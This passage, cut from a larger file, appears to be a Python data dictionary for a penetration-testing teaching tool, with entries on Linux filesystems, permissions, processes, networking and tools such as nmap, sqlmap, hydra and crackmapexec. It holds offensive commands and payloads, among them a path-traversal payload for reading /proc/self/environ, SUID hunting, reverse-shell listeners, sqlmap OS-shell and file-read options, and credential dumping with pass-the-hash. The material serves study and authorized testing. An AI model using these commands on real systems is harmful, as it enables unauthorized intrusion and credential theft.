            "`..` is the whole reason directory traversal exists: ../../../ walks UP out of the web root toward /etc/passwd.",
            "/proc/self/environ can leak secrets (API keys, DB passwords passed as env vars) — a favorite target of LFI/traversal.",
            "Deleting a file only removes one name + frees the inode IF no other name or open handle remains — forensic recovery exploits this.",
            "/proc/[pid]/maps shows a process's memory layout — the prelude to understanding buffer overflows.",
        ],
        "next": ["permissions", "the-shell", "gobuster", "directory traversal"],
        "caution": "Reading /proc and your own files is safe. Reading another user's /proc/[pid]/environ needs privilege — that's the security boundary.",
        "cia": [
            "The filesystem is the primary CONFIDENTIALITY surface — every file has an owner and permission bits deciding who reads it.",
            "INTEGRITY lives here too: write access to the wrong file (a cron script, authorized_keys, a config) = the ability to alter the system.",
            "Path traversal and LFI are filesystem attacks — they abuse the path model (..) to read files outside the intended directory.",
        ],
        "apply": [
            "See an inode: `ls -lai /etc/passwd` — the first number is the inode. The name is just a label on it.",
            "Prove the name-vs-file split: `echo secret > a.txt; ln a.txt b.txt; rm a.txt; cat b.txt` — data survives because b.txt points at the same inode. That's forensic recovery in four commands.",
            "Read live process metadata (the traversal/LFI payoff): `cat /proc/self/cmdline | tr '\\0' ' '; echo; cat /proc/self/environ | tr '\\0' '\\n'` — see your own process's args and environment. THIS is what `?file=../../../proc/self/environ` steals on a vulnerable web app.",
            "Walk a path manually: `cd /etc && cd ../etc/../home && pwd` — watch `..` move you up the tree. Now you understand `../../../etc/passwd`.",
            "List a process's open files: `ls -la /proc/self/fd` — every fd is a symlink to what it points at (files, sockets, pipes).",
        ],
        "try_cmd": "ls -lai /etc/passwd",
    },

    "permissions": {
        "summary": "The core Unix security model — who can read, write, and execute what (and the SUID trap)",
        "typical": "ls -la /etc/shadow     # see owner, group, and the rwx bits",
        "flags": {
            "rwx":           "read / write / execute — three permissions, for three classes: user, group, other. `-rwxr-xr--`.",
            "user/group/other":"The three triplets in `ls -l`. Owner, the file's group, everyone else.",
            "octal (chmod)": "Numeric mode: r=4 w=2 x=1, summed per triplet. 755=rwxr-xr-x, 644=rw-r--r--, 600=owner-only.",
            "dir execute":   "On a DIRECTORY, x means 'may traverse into it'. No x on a dir = can't cd in even if you can read it.",
            "SUID (4000)":   "setuid: the binary runs as its OWNER, not you. A SUID-root binary runs as root — THE classic privesc vector.",
            "SGID / sticky": "SGID = run as group / inherit group; sticky bit (/tmp) = only the owner can delete their files.",
            "chmod/chown":   "chmod changes permission bits; chown changes the owner (needs root). The two levers of access.",
        },
        "read": [
            "UID 0 is root — total power. The whole game of privesc is getting from your UID to UID 0.",
            "SUID is the #1 thing to enumerate on a box: a SUID-root binary with a flaw = instant root. linpeas hunts these for you.",
            "/etc/passwd is world-readable (account list); /etc/shadow is root-only (the hashes). That split IS the access model in action.",
            "'Permission denied' is the kernel enforcing this model — every exploit is ultimately about getting around one of these bits.",
            "A writable config, cron script, or authorized_keys file is as dangerous as a SUID binary — write access = integrity break.",
        ],
        "next": ["linpeas", "processes", "hashcat", "filesystems"],
        "caution": "chmod 777 'to make it work' is the most common real-world misconfiguration — and a finding you'll report constantly.",
        "cia": [
            "Permissions ARE the Confidentiality + Integrity enforcement mechanism of the OS — read bits guard C, write bits guard I.",
            "Privilege escalation is, by definition, a permissions failure: crossing from your rights to higher rights you weren't granted.",
            "SUID is where the model is deliberately bent (run as owner) — which is exactly why it's the most-abused misconfiguration.",
        ],
        "apply": [
            "Read the model directly: `ls -la /etc/passwd /etc/shadow` — note passwd is world-readable (r for other), shadow is not. The kernel enforces that gap.",
            "Hunt SUID binaries exactly like an attacker: `find / -perm -4000 -type f 2>/dev/null` — every result runs as its owner. Cross-check each against GTFOBins; that's the privesc workflow linpeas automates.",
            "Decode octal yourself: `stat -c '%a %n' /etc/shadow` shows the numeric mode. Translate it (640 = rw-r-----) and predict who can read it. Then verify with `ls -la`.",
            "See the directory-execute rule: `mkdir t; chmod 600 t; cd t` fails — no x means no traversal, even though you can read it. `chmod 700 t; cd t` works.",
            "Watch ownership matter: `touch f; ls -la f` (you own it), then try `chown root f` (denied — only root reassigns ownership). That denial IS the boundary.",
        ],
        "try_cmd": "find / -perm -4000 -type f 2>/dev/null",
    },

    "processes": {
        "summary": "Programs in execution — PIDs, the parent/child tree, memory layout, and signals",
        "typical": "ps aux     # every running process: owner, PID, command",
        "flags": {
            "PID / PPID":    "Process ID and Parent PID. Every process has a parent — they form a tree rooted at PID 1 (init/systemd).",
            "fork/exec":     "How processes are born: fork() copies the parent, exec() replaces it with a new program. A shell running a command IS fork+exec.",
            "ps aux / top":  "ps aux = snapshot of all processes; top/htop = live view. First column is the owner — WHO a process runs as.",
            "memory layout": "Each process has: text (code), data, heap (grows up, malloc), stack (grows down, local vars + return addresses).",
            "signals":       "Messages to a process: SIGTERM(15)=ask to stop, SIGKILL(9)=force kill, SIGSEGV(11)=segfault. `kill -9 PID`.",
            "real vs effective UID":"Who you ARE vs who you're RUNNING AS. SUID makes them differ — that's how a SUID-root binary acts as root.",
            "&  nohup  systemd":"Backgrounding: & detaches, nohup survives logout, systemd/cron run things without you. Where persistence lives.",
        },
        "read": [
            "The process owner (ps aux first column) decides what it can touch — a root process is a root-level target if you can hijack it.",
            "/proc/[pid]/maps shows a process's memory regions — stack, heap, libraries. This is the foundation under buffer overflows.",
            "Real vs effective UID is the SUID mechanism: your real UID is you, the effective UID is root — that mismatch is the privesc.",
            "Persistence almost always = a process that restarts: a cron job, a systemd unit, a backgrounded reverse shell.",
            "A zombie (defunct) process has exited but the parent hasn't reaped it; an orphan's parent died and init adopts it.",
        ],
        "next": ["linpeas", "netcat", "permissions", "metasploit"],
        "caution": "kill -9 on the wrong PID can crash a service. On a client box, know what a process IS before you signal it.",
        "cia": [
            "Processes are the INTEGRITY/Availability surface — a process runs with an owner's rights, so hijacking one inherits those rights (integrity), and killing one removes a service (availability).",
            "The real-vs-effective-UID model is the exact mechanism privilege escalation abuses.",
            "A reverse shell, a persistence daemon, a crashed service — all are process-level events. Detection (blue team) watches process spawns closely.",
        ],
        "apply": [
            "See who runs what: `ps aux | head -20` — read the first column (owner). Spot the root processes; those are the high-value hijack targets.",
            "Walk the process tree: `ps -ejH | head -40` or `pstree -p` — watch everything descend from PID 1. fork/exec made every one of those.",
            "Inspect a live process like an attacker: `cat /proc/$$/cmdline | tr '\\0' ' '; echo` ($$ = your shell's PID), then `ls -la /proc/$$/fd` to see its open files/sockets.",
            "See the memory map (overflow prelude): `cat /proc/self/maps` — identify the stack, heap, and loaded libraries. This is literally what exploit devs read.",
            "Practice signals safely: `sleep 300 &` (background a process, note the PID), `ps aux | grep sleep`, then `kill PID`. You just controlled a process's lifecycle.",
        ],
        "try_cmd": "ps aux",
    },

    "networking": {
        "summary": "The attack surface itself — how machines talk: layers, ports, TCP/UDP, sockets, and listeners",
        "typical": "ss -tulpn     # every listening port + the process behind it",
        "flags": {
            "OSI / TCP-IP":  "Layers: L2 Ethernet/MAC, L3 IP (addresses + routing), L4 TCP/UDP (ports), L7 app (HTTP, DNS, SSH).",
            "IP address":    "L3 identity of a host. `ip a` shows yours. A target's IP comes from DNS resolution or a scope list.",
            "port":          "L4 address of a SERVICE on a host. 22=SSH, 80=HTTP, 443=HTTPS, 445=SMB, 3306=MySQL. Open port = a way in.",
            "TCP handshake": "SYN → SYN-ACK → ACK to connect; FIN/RST to close. nmap -sS sends SYN and watches the reply.",
            "UDP":           "No handshake — fire and forget. Faster, spoofable, used by DNS(53), SNMP(161), NTP(123).",
            "socket":        "An endpoint = IP + port. socket→bind→listen→accept (server) vs socket→connect (client). nc is this by hand.",
            "ss / firewall": "ss -tulpn lists listeners; iptables/nftables allow or deny by rule. A firewall is just a packet filter.",
        },
        "read": [
            "An open port is a listening process — `ss -tulpn` ties the port to the PID. That's the bridge between networking and processes.",
            "The TCP handshake is why SYN scans work: nmap sends SYN, an open port replies SYN-ACK, and nmap knows it's open without finishing.",
            "Ports below 1024 need root to bind — that's why a reverse shell on 443 looks legit AND requires privilege to listen there.",
            "A reverse shell is just a socket: the victim connects OUT to your listener (nc -lvnp), bypassing inbound firewall rules.",
            "Knowing well-known ports lets you read an nmap scan instantly: 445 open = SMB = try enum4linux; 3306 = MySQL = try creds.",
        ],
        "next": ["nmap", "netcat", "wireshark", "the-shell"],
        "caution": "Listening services and scans are fine on your own network. On any other network, that's active recon — scope only.",
        "cia": [
            "Networking is the AVAILABILITY pillar's home turf — services must be reachable (uptime), and DoS attacks live here.",
            "It's also the delivery path for Confidentiality/Integrity attacks: data exfiltrates over sockets, exploits arrive over ports.",
            "Every remote attack crosses the network — understanding ports, sockets, and the handshake is understanding the attack surface itself.",
        ],
        "apply": [
            "See your own attack surface: `ss -tulpn` — every listening port and the process behind it. This is exactly what an nmap scan of your box would reveal to an attacker.",
            "Find your IP (the LHOST for any reverse shell): `ip a` — note the inet address on your active interface. That's what you put in a payload's callback.",
            "Build a socket by hand (the netcat lesson, previewed): in one terminal `nc -lvnp 4444` (a listener = bind+listen+accept), in another `nc 127.0.0.1 4444` (a client = connect). Type — you've made a raw TCP channel.",
            "Watch the handshake: `sudo tcpdump -i lo -n 'port 4444' &` then connect with nc — see SYN / SYN-ACK / ACK in the capture. That's the three-way handshake nmap -sS exploits.",
            "Map ports to services: `ss -tulpn` then look up each port number — predict which tool you'd reach for (445→enum4linux, 80→whatweb/gobuster). That's how you read a scan.",
        ],
        "try_cmd": "ss -tulpn",
    },

    # ══════════════════════════════════════════════════════════════
    # OFFENSIVE TOOLS
    # ══════════════════════════════════════════════════════════════

    "nmap": {
        "summary": "Network scanner — maps hosts, ports, services, and vulnerabilities",
        "typical": "nmap -sV -sC -p- 192.168.1.100",
        "flags": {
            "-sV":          "Version detection — fingerprints exact software running on each port",
            "-sC":          "Default NSE scripts — runs common checks like SMB signing, HTTP headers",
            "-p-":          "All 65535 ports (slow but thorough — default only checks top 1000)",
            "-p 80,443,22": "Specific ports only — fast for targeted checks",
            "-A":           "Aggressive: OS detection + version + scripts + traceroute",
            "-sS":          "SYN stealth scan — doesn't complete the handshake, harder to log",
            "-sU":          "UDP scan — finds DNS (53), SNMP (161), NTP (123)",
            "-O":           "OS detection — guesses OS from TCP/IP fingerprint",
            "--script":     "Run specific NSE scripts: --script smb-vuln-ms17-010",
            "-oA":          "Output all formats: -oA scan saves .nmap .xml .gnmap",
            "-T4":          "Timing template (0-5), T4 = aggressive speed, good for labs",
            "--open":       "Only show open ports — cleaner output",
            "-Pn":          "Skip host discovery — scan even if ICMP blocked",
            "-v":           "Verbose — see what nmap is doing in real time",
        },
        "read": [
            "STATE = open means the port is accepting connections — investigate it",
            "open|filtered = port exists but state unclear (firewall involved)",
            "service VERSION tells you exactly what software to search for CVEs",
            "NSE script output shows YES/NO/VULNERABLE for specific checks",
            "OS details may be wrong — it's a fingerprint guess, not a fact",
        ],
        "next": ["nikto (web ports)", "enum4linux (SMB)", "hydra (found services)", "searchsploit (service versions)"],
        "caution": "SYN scans require root. -p- is slow — use -T4 or limit port range first.",
        "cia": [
            "CONFIDENTIALITY — primary. Open ports + service versions expose the attack surface that protects (or leaks) private data.",
            "INTEGRITY — secondary. A version you fingerprint may have a known RCE that lets an attacker alter data/systems.",
            "AVAILABILITY — be careful. Aggressive timing (-T5) or -p- against fragile hosts can knock services over. You're testing C/I, not running a DoS.",
        ],
        "anatomy_cmd": "nmap -sV -sC -p- 192.168.1.100",
        "anatomy": {
            "nmap":           "The binary. Always the first token.",
            "-sV":            "Flag — version detection. You CHOOSE this based on goal (enumeration).",
            "-sC":            "Flag — default scripts. Your choice, adds common safe checks.",
            "-p-":            "Flag — port range. '-' = all 65535. You decide scope vs speed.",
            "192.168.1.100":  "TARGET (an IPv4 host). SOURCE: your scope document, or a host discovered via 'nmap -sn <CIDR>' ping sweep, or resolved from a hostname via DNS.",
        },
    },

    "nikto": {
        "summary": "Web vulnerability scanner — checks for 6,700+ known issues",
        "typical": "nikto -h http://target.com -C all -maxtime 120",
        "flags": {
            "-h":           "Target host or URL",
            "-C all":       "Check ALL categories (default is limited)",
            "-ssl":         "Force HTTPS/SSL testing",
            "-p":           "Specify port: -p 8080",
            "-maxtime":     "Stop after N seconds: -maxtime 300",
            "-o":           "Save output: -o nikto_results.txt",
            "-Format":      "Output format: txt, csv, htm, xml",
            "-id":          "Authentication: -id user:password",
            "-useproxy":    "Route through proxy (Burp): -useproxy http://127.0.0.1:8080",
            "-Tuning":      "Only run certain test types: -Tuning 1 (interesting files)",
        },
        "read": [
            "+ means Nikto found something — every line starting with + is a finding",
            "Missing security headers (X-Frame-Options, CSP) = clickjacking risk",
            "Server: header reveals software version — check it in CVE databases",
            "OSVDB numbers are old — cross-reference with CVE.mitre.org",
            "False positives are common — verify every finding manually",
        ],
        "next": ["gobuster (path enum)", "sqlmap (if forms found)", "burp (manual testing)", "nuclei (template scan)"],
        "caution": "Nikto is loud — it will appear in IDS logs. Don't use without authorization.",
        "cia": [
            "CONFIDENTIALITY — primary. Finds exposed files, backups, and info-leak headers that reveal data they shouldn't.",
            "INTEGRITY — secondary. Flags outdated server software whose known bugs could let an attacker modify content.",
            "AVAILABILITY — low. Nikto reads, it doesn't break things, but its request volume can stress tiny servers.",
        ],
        "anatomy_cmd": "nikto -h http://target.com -C all -maxtime 120",
        "anatomy": {
            "nikto":              "The binary.",
            "-h":                 "Flag introducing the target host.",
            "http://target.com":  "TARGET (a URL). SOURCE: a web port (80/443/8080) found by nmap, or a hostname/vhost from DNS / subfinder. The scheme (http vs https) comes from which port was open.",
            "-C all":             "Flag value — check all plugin categories. Your choice.",
            "-maxtime":           "Flag — time budget you set; 120 = stop after 2 minutes.",
        },
    },

    "gobuster": {
        "summary": "Directory/subdomain brute forcer — finds hidden paths and virtual hosts",
        "typical": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 30 -q",
        "flags": {
            "dir":          "Directory enumeration mode",
            "dns":          "Subdomain enumeration: gobuster dns -d target.com -w wordlist.txt",
            "vhost":        "Virtual host discovery (different sites on same IP)",
            "-u":           "Target URL",
            "-w":           "Wordlist path",
            "-t":           "Threads (default 10, use 30-50 for speed in labs)",
            "-x":           "File extensions to append: -x php,html,txt,bak,zip",
            "-b":           "Status codes to ignore: -b 404,500",
            "-q":           "Quiet mode — only show results",
            "-o":           "Save output to file",
            "-k":           "Skip TLS certificate verification",
            "--exclude-length": "Hide responses of specific lengths (filter noise)",
        },
        "read": [
            "Status 200 = directly accessible — investigate immediately",
            "Status 301/302 = redirect, follow it — usually still accessible",
            "Status 403 = forbidden but EXISTS — try bypass techniques",
            "Status 401 = authentication required — credential attack opportunity",
            "Large response sizes vs small may indicate different content — compare",
        ],
        "next": ["ffuf (deeper fuzzing)", "curl/browser (inspect found paths)", "sqlmap (if forms)"],
        "caution": "High thread counts can crash fragile apps. Start with -t 10 on production.",
        "cia": [
            "CONFIDENTIALITY — primary. Hidden paths (/admin, /backup, /.git) often expose data or controls never meant to be public.",
            "INTEGRITY — secondary. A discovered upload or admin endpoint can become the door to altering the app.",
            "AVAILABILITY — watch the threads. -t 50 against a fragile app is effectively a mini load test; you can take it down.",
        ],
        "anatomy_cmd": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 30 -q",
        "anatomy": {
            "gobuster":       "The binary.",
            "dir":            "Mode (subcommand). 'dir' = path brute. You pick based on goal: dir/dns/vhost.",
            "-u http://...":  "TARGET URL. SOURCE: a live web host from nmap, or a subdomain from subfinder/amass.",
            "-w /usr/share/wordlists/dirb/common.txt": "WORDLIST (the guesses). SOURCE: ships with Kali (dirb), or from SecLists (/usr/share/seclists/Discovery/Web-Content/). Pick a list that matches the tech — bigger list = more coverage, slower.",
            "-t 30":          "Threads — YOUR speed/safety dial. 30 is brisk for a lab.",
            "-q":             "Quiet flag — your choice, shows only hits.",
        },
    },

    "sqlmap": {
        "summary": "Automated SQL injection scanner and exploiter",
        "typical": "sqlmap -u 'http://target.com/page?id=1' --dbs --batch",
        "flags": {
            "-u":           "Target URL with injectable parameter",
            "--dbs":        "Enumerate all databases",
            "--tables":     "Enumerate tables: -D dbname --tables",
            "--dump":       "Dump table data: -D db -T users --dump",
            "--batch":      "Auto-answer all prompts (non-interactive)",
            "--level":      "Test depth 1-5 (default 1, use 3+ for more vectors)",
            "--risk":       "Risk level 1-3 (higher = more aggressive, possible data modification)",
            "--forms":      "Auto-detect and test HTML forms",
            "--crawl":      "Spider the site and test all found parameters: --crawl=3",
            "--data":       "POST data: --data='user=test&pass=test'",
            "--cookie":     "Session cookie: --cookie='PHPSESSID=abc123'",
            "--tamper":     "Bypass WAF: --tamper=space2comment,randomcase",
            "--os-shell":   "Get OS shell (requires FILE privilege on DB user)",
            "--file-read":  "Read server file: --file-read=/etc/passwd",
            "--tor":        "Route through Tor (slow but anonymous)",
            "-p":           "Specify parameter to test: -p id",
        },
        "read": [
            "Type: UNION query based means we can extract data with UNION SELECT",
            "Type: Boolean-based blind means true/false responses — slower data extraction",
            "Type: Time-based blind means inferring data by response delay — very slow",
            "available databases shows everything accessible with the DB user's permissions",
            "Check the dump for password hashes — run them through hashcat next",
        ],
        "next": ["hashcat (crack dumped hashes)", "database browsing (find useful tables)", "os-shell (if FILE priv)"],
        "caution": "--risk 3 and --level 5 can modify data and crash the application. Use carefully.",
        "cia": [
            "CONFIDENTIALITY — primary & severe. SQLi can dump entire databases — credentials, PII, secrets. This is the textbook confidentiality breach.",
            "INTEGRITY — high. With write access (or --os-shell) an attacker can alter or delete records, not just read them.",
            "AVAILABILITY — real risk. --risk 3 can issue destructive queries; a bad payload can corrupt or lock tables. Know the risk level you set.",
        ],
        "anatomy_cmd": "sqlmap -u 'http://target.com/page?id=1' -p id --dbs --batch",
        "anatomy": {
            "sqlmap":         "The binary.",
            "-u 'http://target.com/page?id=1'": "TARGET URL with a parameter. SOURCE: a form/link found while browsing, gobuster path discovery, or a request captured in Burp (then use -r request.txt instead).",
            "?id=1":          "The INJECTABLE PARAMETER in the URL. SOURCE: any user-controlled input — you identify it by spotting '?name=value' in links or form fields.",
            "-p id":          "Tells sqlmap WHICH parameter to test ('id'). You name the one you suspect.",
            "--dbs":          "Action — enumerate databases. Your goal-driven choice.",
            "--batch":        "Auto-answer prompts. Your convenience flag.",
        },
    },

    "hydra": {
        "summary": "Network login brute forcer supporting 50+ protocols",
        "typical": "hydra -l admin -P ~/.err0rs/wordlists/rockyou.txt ssh://192.168.1.100 -t 4",
        "flags": {
            "-l":           "Single username: -l admin",
            "-L":           "Username list file: -L users.txt",
            "-p":           "Single password: -p password123",
            "-P":           "Password list: -P rockyou.txt",
            "-C":           "Colon-separated credentials: -C creds.txt (user:pass per line)",
            "-t":           "Parallel tasks per target (default 16, use 4 for SSH to avoid lockout)",
            "-s":           "Custom port: -s 2222",
            "-f":           "Stop on first valid credential",
            "-v":           "Verbose (show attempts)",
            "-V":           "Very verbose (every attempt — very noisy)",
            "-o":           "Save found credentials to file",
            "http-post-form": "Web login: 'http-post-form://target/login:user=^USER^&pass=^PASS^:Invalid'",
        },
        "read": [
            "[DATA] line shows config — verify target/protocol are correct before waiting",
            "[STATUS] shows speed — if very slow, reduce threads or check connectivity",
            "login: USER   password: PASS = valid credential found — stop and test it",
            "Connection refused = service isn't running on that port",
            "Max connections reached = reduce -t (thread count)",
        ],
        "next": ["ssh/rdp with found creds", "crackmapexec (test creds across network)", "evil-winrm (Windows WinRM)"],
        "caution": "Account lockout is real. Use -t 4 for SSH. Test with 1-2 passwords first on prod systems.",
        "cia": [
            "CONFIDENTIALITY — primary. A cracked login is direct unauthorized access to whatever that account can see.",
            "INTEGRITY — high. Valid creds often mean the ability to change data or config, not just read it.",
            "AVAILABILITY — direct threat. Online brute force triggers account lockouts — you can lock out real users (a self-inflicted DoS). This is why offline cracking (hashcat) is preferred when you have a hash.",
        ],
        "anatomy_cmd": "hydra -l admin -P rockyou.txt ssh://192.168.1.100 -t 4",
        "anatomy": {
            "hydra":          "The binary.",
            "-l admin":       "USERNAME (single). SOURCE: enum4linux/theHarvester user lists, a login page, or a known default. Use -L users.txt for a list.",
            "-P rockyou.txt": "PASSWORD LIST. SOURCE: rockyou (Kali ships it gzipped at /usr/share/wordlists/), SecLists, or a custom list from cewl scraped off the target site.",
            "ssh://":         "PROTOCOL — must match a service nmap found open (ssh, ftp, rdp, http-post-form...).",
            "192.168.1.100":  "TARGET host. SOURCE: nmap result. The service must actually be open on it.",
            "-t 4":           "Threads — KEEP LOW for SSH (4) to avoid lockouts. Your safety dial.",
        },
    },

    "nuclei": {
        "summary": "Fast template-based vulnerability scanner with 6,000+ templates",
        "typical": "nuclei -u http://target.com -t http/ -severity critical,high",
        "flags": {
            "-u":           "Target URL",
            "-l":           "List of targets: -l targets.txt",
            "-t":           "Template directory/file: -t http/cves/",
            "-severity":    "Filter by severity: -severity critical,high,medium",
            "-tags":        "Filter by tags: -tags rce,sqli,xss,cve",
            "-o":           "Output file: -o nuclei_output.txt",
            "-j":           "JSON output (good for parsing)",
            "-rate-limit":  "Requests per second: -rate-limit 50",
            "-c":           "Concurrency: -c 25",
            "-update-templates": "Update template library to latest",
            "-stats":       "Show scan statistics",
            "-silent":      "Only output findings",
            "-debug":       "Debug mode (see HTTP requests)",
        },
        "read": [
            "[critical] [template-name] means a confirmed critical vuln — exploit this first",
            "[info] findings are not vulnerabilities — just enumeration (interesting files, tech stack)",
            "Template ID tells you exactly what was found — google it for details",
            "[matched] shows what specific string or condition triggered the match",
            "False positives happen — verify critical/high findings manually",
        ],
        "next": ["exploit the CVE (searchsploit/metasploit)", "manual verification (curl/burp)", "report generation"],
        "caution": "Some templates send active exploit payloads. Use -severity info,low for passive-only.",
        "cia": [
            "CONFIDENTIALITY — primary. Templates surface exposures (open dashboards, info leaks, default creds) that expose data.",
            "INTEGRITY — high. CVE templates confirm known RCE/injection bugs that let an attacker alter the system.",
            "AVAILABILITY — caution. Some templates fire real exploit payloads; against fragile targets that can crash a service. Filter with -severity to stay light.",
        ],
        "anatomy_cmd": "nuclei -u http://target.com -t http/ -severity critical,high",
        "anatomy": {
            "nuclei":         "The binary.",
            "-u http://target.com": "TARGET URL. SOURCE: a live web host from nmap, a subdomain from subfinder. Use -l targets.txt for many.",
            "-t http/":       "TEMPLATE set to run. SOURCE: the built-in template library (~/nuclei-templates/, kept fresh with -update-templates). You narrow it by tech you fingerprinted (e.g. -t http/cves/).",
            "-severity critical,high": "FILTER — your choice. Limits to high-impact templates: fewer requests, more signal, quieter.",
        },
    },

    "whatweb": {
        "summary": "Web fingerprinter — identifies CMS, frameworks, servers, JS libraries",
        "typical": "whatweb http://target.com -a 3",
        "flags": {
            "-a":           "Aggression level 1-4 (3 = active fingerprinting, 4 = very aggressive)",
            "-v":           "Verbose output — shows all identified components",
            "--log-brief":  "Brief summary output",
            "--log-json":   "JSON output for scripting",
            "-i":           "Input file with multiple targets",
            "--proxy":      "Route through Burp: --proxy 127.0.0.1:8080",
        },
        "read": [
            "WordPress[x.x.x] = exact version — search WPScan database for vulns",
            "Apache[version], nginx[version] = known CVEs for that exact version",
            "PHP[version] = older PHP versions have many RCEs",
            "jQuery[version] = older jQuery has XSS vulnerabilities",
            "Country/IP info tells you CDN vs direct server",
        ],
        "next": ["searchsploit (identified CMS/versions)", "wpscan (WordPress)", "nikto/nuclei (full scan)"],
        "caution": "Aggression level 4 will POST data and may leave traces in app logs.",
        "cia": [
            "CONFIDENTIALITY — indirect. Fingerprinting itself reads public banners; the value is knowing WHICH stack to attack for data later.",
            "INTEGRITY — indirect. Identifying an exact CMS/version points you to the known bug that enables tampering.",
            "AVAILABILITY — minimal. At -a 1 it's one request (near-invisible). -a 4 POSTs data and is louder, but still doesn't break things.",
        ],
        "anatomy_cmd": "whatweb http://target.com -a 1",
        "anatomy": {
            "whatweb":        "The binary.",
            "http://target.com": "TARGET URL. SOURCE: a live web host from nmap, or a subdomain from subfinder/amass. Scheme matches the open port.",
            "-a 1":           "AGGRESSION (1-4). YOUR stealth dial: -a 1 = a single passive-looking request (recon-first), -a 3+ = active probing that touches the app more.",
        },
    },

    "enum4linux": {
        "summary": "SMB/NetBIOS enumeration — dumps users, shares, groups, password policy",
        "typical": "enum4linux -a 192.168.1.100",
        "flags": {
            "-a":   "All enumeration (combines -U -S -G -P -r -o -n -i)",
            "-U":   "Enumerate users via RPC",
            "-S":   "Enumerate shares",
            "-G":   "Enumerate groups",
            "-P":   "Get password policy (min length, lockout threshold)",
            "-r":   "RID cycling (brute force user IDs to discover accounts)",
            "-n":   "NetBIOS nameservice info",
            "-u":   "Authentication: -u admin -p password",
            "-o":   "OS information",
        },
        "read": [
            "user:[USERNAME] rid:[N] = discovered user account — add to your list",
            "Sharename = accessible share — mount it: smbclient //target/share",
            "NULL session allowed = can enumerate without credentials (misconfiguration)",
            "Minimum password length shows how strong to make brute force attempts",
            "DOMAIN\\Group shows structure — interesting for AD attacks",
        ],
        "next": ["crackmapexec (test creds on discovered users)", "smbclient (mount shares)", "hydra (brute user list)"],
        "caution": "RID cycling (-r) generates lots of traffic and may trigger IDS.",
        "cia": [
            "CONFIDENTIALITY — primary. Null-session enumeration leaks users, shares, and policy that should require auth to see.",
            "INTEGRITY — secondary. Accessible shares it finds may be writable, enabling tampering or payload drops.",
            "AVAILABILITY — low, but -r (RID cycling) is chatty and can trip IDS, indirectly inviting a defensive lockout response.",
        ],
        "anatomy_cmd": "enum4linux -a 192.168.1.100",
        "anatomy": {
            "enum4linux":     "The binary.",
            "-a":             "ALL enumeration (users+shares+groups+policy+RID). Your breadth choice; -U alone is quieter.",
            "192.168.1.100":  "TARGET host running SMB. SOURCE: nmap showing port 139/445 open. Must be a Windows/Samba box for anything to come back.",
        },
    },

    "crackmapexec": {
        "summary": "Swiss army knife for Active Directory pentesting and lateral movement",
        "typical": "crackmapexec smb 192.168.1.0/24 -u admin -p password",
        "flags": {
            "smb":          "SMB protocol (most common for AD)",
            "ssh":          "SSH credential testing",
            "winrm":        "Windows Remote Management",
            "rdp":          "Remote Desktop testing",
            "-u":           "Username or file: -u users.txt",
            "-p":           "Password or file: -p passwords.txt",
            "-H":           "NTLM hash (pass-the-hash): -H aad3b435b51404eeaad3b435b51404ee:hash",
            "--shares":     "Enumerate accessible SMB shares",
            "--sam":        "Dump SAM database (local accounts)",
            "--lsa":        "Dump LSA secrets",
            "--ntds":       "Dump Active Directory database",
            "-x":           "Execute command: -x 'whoami'",
            "-X":           "Execute PowerShell: -X 'Get-Process'",
            "--local-auth": "Authenticate as local account (not domain)",
        },
        "read": [
            "[+] = success — credentials work on this host",
            "Pwn3d! = you have admin access — this is the big one",
            "[*] = informational",
            "[-] = failed",
            "STATUS_LOGON_FAILURE = wrong creds",
            "STATUS_ACCOUNT_LOCKED_OUT = account locked — stop immediately",
        ],
        "next": ["evil-winrm (if WinRM open)", "mimikatz (dump hashes)", "bloodhound (map the domain)"],
        "caution": "Password spraying with wrong timing will lock out accounts. Check password policy first.",
        "cia": [
            "CONFIDENTIALITY — primary. Valid creds + --shares/--sam/--ntds reads data and secrets across many hosts at once.",
            "INTEGRITY — high. -x/-X execute commands on every box you own — full ability to modify those systems.",
            "AVAILABILITY — real risk. Spraying without checking the lockout policy locks out real accounts (a self-inflicted DoS). Check policy FIRST.",
        ],
        "anatomy_cmd": "crackmapexec smb 192.168.1.0/24 -u admin -p 'Spring2026!'",
        "anatomy": {
            "crackmapexec":   "The binary.",
            "smb":            "PROTOCOL. SOURCE: which service is open (smb/winrm/ssh/rdp) — from nmap. SMB is the AD workhorse.",
            "192.168.1.0/24": "TARGET range (CIDR). SOURCE: your scope / the subnet nmap revealed. Sweeps every host in the block.",
            "-u admin":       "USERNAME. SOURCE: enum4linux user list, a cracked cred, a known default. -u users.txt for a list.",
            "-p 'Spring2026!'": "PASSWORD. SOURCE: a hashcat crack, responder capture→crack, an OSINT guess, or a default. Spray ONE password across users to avoid lockouts.",
            "(pass-the-hash)": "ALT: -H <ntlm-hash> instead of -p uses a hash you dumped — no plaintext needed.",
        },
    },

    "ffuf": {
        "summary": "Fast web fuzzer — directory, parameter, header, and vhost discovery",
        "typical": "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302",
        "flags": {
            "-u":           "URL with FUZZ keyword as injection point",
            "-w":           "Wordlist path",
            "-mc":          "Match HTTP codes: -mc 200,301,302,403",
            "-fc":          "Filter HTTP codes: -fc 404,500",
            "-fs":          "Filter by response size: -fs 1234",
            "-fw":          "Filter by word count",
            "-t":           "Threads: -t 50",
            "-H":           "Add header: -H 'Cookie: session=abc'",
            "-d":           "POST data: -d 'user=FUZZ&pass=password'",
            "-X":           "HTTP method: -X POST",
            "-e":           "Extensions: -e .php,.html,.txt,.bak",
            "-o":           "Output file: -o results.json",
            "-of":          "Output format: json, csv, ecsv, md",
            "-recursion":   "Recurse into found directories",
        },
        "read": [
            "High response size differences usually indicate real content",
            "Filter noise first: run once, note the common response size, add -fs to hide it",
            "403s are interesting — directory exists but is blocked",
            "FUZZ can go anywhere in the URL — parameters, headers, paths",
            "Use multiple wordlists by specifying -w multiple times with :FUZZ labels",
        ],
        "next": ["curl/browser (inspect findings)", "sqlmap (if parameter fuzzing found injection)"],
        "caution": "High thread counts can DoS unstable applications. Start at -t 25.",
        "cia": [
            "CONFIDENTIALITY — primary. Discovers hidden endpoints, params, and vhosts that expose data or admin surface.",
            "INTEGRITY — secondary. A fuzzed-out upload/API endpoint can become the path to modifying the app.",
            "AVAILABILITY — real. ffuf is FAST; high -t against a fragile app is effectively a load test. Throttle with -rate / lower -t.",
        ],
        "anatomy_cmd": "ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302",
        "anatomy": {
